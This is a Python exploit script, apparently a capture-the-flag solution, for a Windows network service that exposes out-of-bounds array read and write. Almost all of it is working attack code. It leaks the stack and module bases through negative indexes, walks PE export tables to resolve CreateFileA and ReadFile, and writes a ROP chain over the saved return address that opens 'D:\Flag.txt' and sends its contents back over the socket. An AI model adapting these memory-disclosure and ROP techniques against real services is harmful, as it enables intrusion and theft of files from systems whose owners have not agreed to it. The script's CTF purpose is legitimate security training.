#!/usr/bin/python

#we don't do pwntools

import struct
import socket
import sys
import time
import os
import math
import telnetlib

def p(f, *args):
    return struct.pack(f, *args)

p32 = lambda x: p("<I", x)
p64 = lambda x: p("<Q", x)

def u(f, v):
    return struct.unpack(f, v)

u32 = lambda x: u("<I", x.ljust(4, '\x00')[:4])[0]
u64 = lambda x: u("<Q", x.ljust(8, '\x00')[:8])[0]

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

tgthost = sys.argv[1]
tgtport = int(sys.argv[2])

target = (tgthost, tgtport)

class Exports(object):
    def __init__(self, funcs, ords, names, num_names):
        self.AoF = funcs
        self.AoNO = ords
        self.AoN = names
        self.NoN = num_names

class MemoryHelper(object):
    def __init__(self, sock):
        self.sock = s
        self.imports = {}
        self.buf_addr = 0
 
    # help with address translations
    def set_buffer_address(self, addr):
        self.buf_addr = addr
 
    def read_until(self, content, echo = True):
        x = ""
        while True:
            y = self.sock.recv(1)
            if not y:
                return None
            x += y
            if x.endswith(content):
                if echo:
                    sys.stderr.write(x)
                return x
 
    # readline
    def rl(self):
        return self.read_until('\n')
 
    # perform a service read interaction
    def _read(self, idx):
        self.read_until("Write\n")
        self.sock.send("1\n")
        self.read_until(": ")
        self.sock.send("%d\n" % idx)
        return self.rl()[:-1]

    # perform a service write interaction 
    def _write(self, idx, v):
        self.read_until("Write\n")
        self.sock.send("2\n")
        self.read_until(": ")
        self.sock.send("%d\n" % idx)
        self.read_until(": ")
        self.sock.send("%x\n" % v)
 
    # convert an address in the target space into its 
    # corresponding negative index in the integer array
    def addr_to_index(self, addr):
        delta = addr - self.buf_addr
        if delta > 0:
            delta -= 0x100000000
        return delta / 4;

    # read a string from the target address space 
    def get_string(self, addr):
        r = ''
        # our reads are only on 4 byte boundaries so we need to make some adjustments
        start = addr
        addr = addr & ~3
        first = True
        while not '\x00' in r:
            r += p32(int(self._read(self.addr_to_index(addr)), 16))
            if first:
                first = False
                r = r[start - addr:]
            addr += 4
        return r.split('\x00')[0]
 
    # get a short from the target address space
    def get_short(self, addr):
        # our reads are only on 4 byte boundaries so we need to make some adjustments
        start = addr
        addr = addr & ~3
        first = True
        v = int(self._read(self.addr_to_index(addr)), 16)
        if start == addr:
            return v & 0xffff
        return v >> 16

    # given a arbitrary address, get the base address of the
    # containing module 
    def get_module_handle(self, addr):
        handle = addr & 0xffff0000
        while True:
            magic = int(self._read(self.addr_to_index(handle)), 16)
            if p32(magic).startswith("MZ"):
                break
            handle -= 0x10000
 
        pe_offset = int(self._read(self.addr_to_index(handle + 0x3c)), 16)
        pe = handle + pe_offset
        export = handle + int(self._read(self.addr_to_index(pe + 0x18 + 0x60)), 16)
 
        AoF = handle + int(self._read(self.addr_to_index(export + 0x1C)), 16)
        AoNO = handle + int(self._read(self.addr_to_index(export + 0x24)), 16)
        AoN = handle + int(self._read(self.addr_to_index(export + 0x20)), 16)
        NoN = int(self._read(self.addr_to_index(export + 0x18)), 16)

        # save export table information for this module 
        self.imports[handle] = Exports(AoF, AoNO, AoN, NoN)
        return handle

    def get_proc_address(self, handle, func):
        exports = self.imports[handle]
        lo = 0
        hi = exports.NoN
        while lo < hi:
             mid = (lo + hi) // 2
             midstr = handle + int(self._read(self.addr_to_index(exports.AoN + mid * 4)), 16)
             fname = self.get_string(midstr)
             if func == fname:
                  ordinal = self.get_short(exports.AoNO + mid * 2)
                  return handle + int(self._read(self.addr_to_index(exports.AoF + ordinal * 4)), 16)
             elif func < fname:
                  hi = mid
             else:
                  lo = mid + 1
        return None

s = socket.socket()
s.connect(target)

mh = MemoryHelper(s)

base_loc = -1073741824  # * 4 == 0 % 2^32
retidx = 256 + 17 + 8 + 4 + 2  # number of integers between buffer and return address

stack = int(mh._read(base_loc + retidx - 1), 16) # saved ebp
retaddr = int(mh._read(base_loc + retidx), 16)   # save return address

exe_base = retaddr & 0xffff0000
_gmhw = exe_base + 0x302c
_recv = exe_base + 0x3064
_send = exe_base + 0x305c
bss = exe_base + 0x4000
_exit = exe_base + 0x30cc

ret_gadget = exe_base + 0x148E

clients = retidx + 6   # multiple copies of socket handle here

client = int(mh._read(base_loc + clients), 16)   # leak the socket handle

print "client = 0x%x" % client

# fuzzy sp in main so we do a few reads to find the saved return address
rbp_idx = 0
for i in range(10):
    v = int(mh._read(base_loc + retidx + i + (0x360 / 4)), 16)
    if (v & 0xffff) == 0x165F:
        main_ret = retidx + i + (0x360 / 4)
        rbp_idx = main_ret - 1
        break

print "rbp idx 0x%x" % rbp_idx
print "Stack: 0x%x" % stack
buf_addr = stack - 4 * rbp_idx    #  address of the 256 integers array
print "buf_addr 0x%x" % buf_addr
saved_eip = buf_addr + 0x47c

mh.set_buffer_address(buf_addr)

# read some function addresses from the import table
gmh_addr = int(mh._read(mh.addr_to_index(_gmhw)), 16)
exit_addr = int(mh._read(mh.addr_to_index(_exit)), 16)
send_addr = int(mh._read(mh.addr_to_index(_send)), 16)

print "GetModuleHandle 0x%x" % gmh_addr

#find kernel32 base:
k32 = mh.get_module_handle(gmh_addr)

print "kernel32 = 0x%x" % k32

#find crt base:
crt = mh.get_module_handle(exit_addr)

CreateFileA = mh.get_proc_address(k32, "CreateFileA")
ReadFile = mh.get_proc_address(k32, "ReadFile")

print "CreateFileA: 0x%x" % CreateFileA
print "ReadFile: 0x%x" % ReadFile

# write the flag filename into their memory
mh._write(mh.addr_to_index(bss + 0xc00), u32("D:\\F"))
mh._write(mh.addr_to_index(bss + 0xc00 + 4), u32("lag."))
mh._write(mh.addr_to_index(bss + 0xc00 + 8), u32("txt\x00"))

# need to get return value from CreateFileA loaded into the stack for ReadFile
# but don't want to find a gadget to do it so increment by 4 from leaked socket
# handle and read several times, hoping one of the guesses is correct
rop = [CreateFileA, ret_gadget, bss + 0xc00, 0x80000000, 1, 0, 3, 128, 0,
       ReadFile, ret_gadget, client + 0x4, bss + 0x100, 0x200, bss, 0,
       ReadFile, ret_gadget, client + 0x8, bss + 0x100, 0x200, bss, 0,
       ReadFile, ret_gadget, client + 0xc, bss + 0x100, 0x200, bss, 0,
       ReadFile, ret_gadget, client + 0x10, bss + 0x100, 0x200, bss, 0,
       send_addr, exit_addr, client, bss + 0x100, 0x200, 0]

# write the rop chain
i = 0
for r in rop:
    mh._write(base_loc + retidx + i, r)
    i += 1

# exit the read/write loop to start the rop
s.send("3")
time.sleep(0.5)
s.send("3")

# read whatever comes back, hopefully a flag!
interact(s)

s.close()
